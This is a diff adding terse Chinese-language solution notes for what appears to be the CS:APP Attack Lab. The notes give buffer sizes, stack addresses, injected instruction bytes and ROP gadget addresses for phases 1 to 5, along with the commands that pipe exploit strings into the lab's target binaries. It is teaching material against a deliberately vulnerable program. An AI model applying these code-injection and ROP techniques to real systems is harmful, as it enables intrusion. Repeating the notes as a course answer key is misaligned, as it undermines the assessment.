@@ -1,0 +1,72 @@
+./hex2raw < c03.txt > c03-raw.txt
+./ctarget < c03-raw.txt
+
+gdb ctarget
+run < c03-raw.txt -q
+
+./hex2raw < c03.txt > c03-raw.txt
+./ctarget -i c03-raw.txt -q 
+
+gcc -c c03.s
+objdump -d c03.o > c03.d
+
+Phase 1: 
+
+touch1的开始地址: 0x4017c0
+getbuf()的缓存大小： 40 bytes
+字符串存储地址: [0x5561dc78 - 0x5561dca0]
+Gets()的返回地址：0x4017b4（正常执行），地址：0x5561dc70
+getbuf()的返回地址：0x401976(正常执行)，地址：0x5561dca0
+
+答案：
+cat c01.txt | ./hex2raw | ./ctarget -q
+                                                                 
+
+
+Phase 2:
+touch2的开始地址：0x4017ec
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	68 ec 17 40 00       	pushq  $0x4017ec
+   c:	c3                   	retq   
+
+答案：
+cat c02.txt | ./hex2raw | ./ctarget -q
+
+Phase 3:
+touch3的开始地址：0x4018fa
+Cookie：0x  5  9  b  9  9  7  f  a
+ASCII:     35 39 62 39 39 37 66 61
+
+0x         61 66 37 39 39 62 39 35
+
+
+run < c03-raw.txt -q
+
+答案：
+cat c03.txt | ./hex2raw | ./ctarget -q
+
+Phase 4:
+test()函数开始地址：0x401968
+函数调用图：test() -> getbuf() -> Gets() -> retq -> retq -> exit
+popq $rax：rax = [rsp], rsp = rsp + 0x8
+
+run < c04-raw.txt -q
+
+答案：
+cat c04.txt | ./hex2raw | ./rtarget -q
+
+解题思路：
+0x4019a7 + 4 = 0x4019ab
+popq rax
+nop
+retq
+
+0x4019a0 + 2 = 0x4019a2
+movq rax, rdi
+retq
+
+
+Phase 5:
+
+答案：
+cat c05.txt | ./hex2raw | ./rtarget -q
